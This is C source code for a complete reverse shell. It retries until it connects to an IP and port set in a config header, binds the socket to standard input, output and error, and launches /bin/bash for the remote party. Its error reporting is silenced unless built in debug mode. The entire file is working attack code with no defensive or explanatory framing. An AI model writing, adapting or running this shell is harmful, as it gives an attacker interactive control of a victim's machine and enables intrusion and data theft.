#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#ifdef DEBUG
#include <stdio.h>
#endif

#include "Config.h"
#include "utils.h"

int connectToSv(const char* ip, short port, int* sock)
{
    struct sockaddr_in serv_addr;
    int sockfd;
    
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
#ifdef DEBUG
        perror("Couldn't Allocate Socket");
#endif
        return -1;
    }
    *sock = sockfd;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if(inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
#ifdef DEBUG
        perror("Invalid IP Address");
#endif
        return -2;
    }

    if(connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
#ifdef DEBUG
        perror( "Couldn't Connect to Server");
#endif
        return -3;
    }
    
    return 0;

}

int main(int argc, char* argv[], char* envp[]) 
{
    int sockfd;
    int res;

    while(1) {
        res = connectToSv(IP, PORT, &sockfd);
        if( res == 0 ) break;
        else if(res != -1) close(sockfd);
        continue;
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    char* shellArgv[2] = {"/bin/bash", NULL};
    execve("/bin/bash", shellArgv, envp);
    close(sockfd);
    exit(EXIT_SUCCESS);
}
